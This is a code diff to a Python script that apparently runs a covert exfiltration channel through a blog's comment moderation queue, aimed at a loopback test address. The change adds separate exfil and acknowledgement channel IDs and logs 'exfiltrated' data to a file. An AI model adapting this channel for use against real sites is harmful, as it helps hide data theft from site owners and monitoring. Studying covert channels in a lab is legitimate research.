@@ -9,7 +9,8 @@ import datetime
 random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))
 
 target_blog = "http://127.0.0.3/"
-exfil_channel = "2021/08/06/hello-world/"
+exfil_channel_id = 5
+ack_channel_id = 7
 
 server_time_slot = "2:22"
 client_time_slot = "1:11"
@@ -57,7 +58,7 @@ def get_current_unapproved_index():
 
     random_string = generate_random_string(10)
     comment_to_send = random_string + ": get_current_unapproved_index (" + str(comment_index) + ") "
-    response = submit_comment(target_blog + exfil_channel, comment_to_send)
+    response = submit_comment(target_blog, exfil_channel_id, comment_to_send)
     comment_index += 1
 
     response_splitted = response.split("\n")
@@ -78,7 +79,7 @@ def get_moderation_hash_from_url(url):
 
 def get_moderation_hash_at_current_time():
     random_string = generate_random_string(10)
-    response = submit_comment(random_string + ": Getting_moderation_hash")
+    response = submit_comment(target_blog, exfil_channel_id, random_string + ": Getting_moderation_hash")
 
     response_splitted = response.split("\n")
     response_details = response_splitted[-1]
@@ -135,15 +136,21 @@ while(loop_counter > 0):
                 elems = soup.find_all("div", class_="comment-content")
                 elem = elems[-1]
                 if elem and elem.string:
+                    exfil_content = str(elem.string).strip()
                     to_write = str(datetime.datetime.utcnow()) + ": "
-                    to_write += "Extracted data with timeslot of " + client_time_slot + ": " + str(elem.string).strip() + "\n"
+                    to_write += "Extracted data with timeslot of " + client_time_slot + ": " + exfil_content + "\n"
                     print("[INFO] " + to_write);
                     f = open("../output/exfiltrated.txt", "a")
                     f.write(to_write)
                     f.close()
 
+                    message_id = exfil_content.split(":")[0]
+                    print("[INFO] Extracted message_id is " + message_id)
+                    submit_comment(target_blog, ack_channel_id, message_id)
+
                     processed_unapproved_indexes.append(current_unapproved_index)
                     print("## processed_unapproved_indexes: " + str(processed_unapproved_indexes))
+                    
                     break
             else:
                 print("[INFO] No comment for moderation for " + client_time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")
